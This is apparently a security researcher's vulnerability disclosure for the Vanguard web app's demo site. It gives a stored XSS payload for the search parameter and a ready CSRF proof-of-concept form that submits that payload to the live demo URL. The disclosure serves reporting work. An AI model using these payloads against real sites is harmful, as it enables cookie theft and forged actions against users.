### Vanguard   XSS/CSRF

#### ADLab of Venustech

Well, when I pentest the official demo site of Vanguard, I found some vulnerabilities here.


#### XSS:

There're some stored-xss in this system, for example:

```
http://vanguard-demo.esy.es/search
```

POST para:
```
POST parameter：

phps_query=123'"><svg/onload=alert(document.cookie)><'"&phps_search=

------WebKitFormBoundaryfu9qSQ2wg10j0QFz
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Vanguard/xss.png)


#### CSRF:

Because of no protection here, we can use csrf attack to cheat the user to suffer from reflect-xss, or change something sensitive int the panel directly.
By the way ,I just found no protection in the user panel here.

POC:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://vanguard-demo.esy.es/search" method="POST">
      <input type="hidden" name="phps&#95;query" value="123&apos;&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;cookie&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="phps&#95;search" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


```

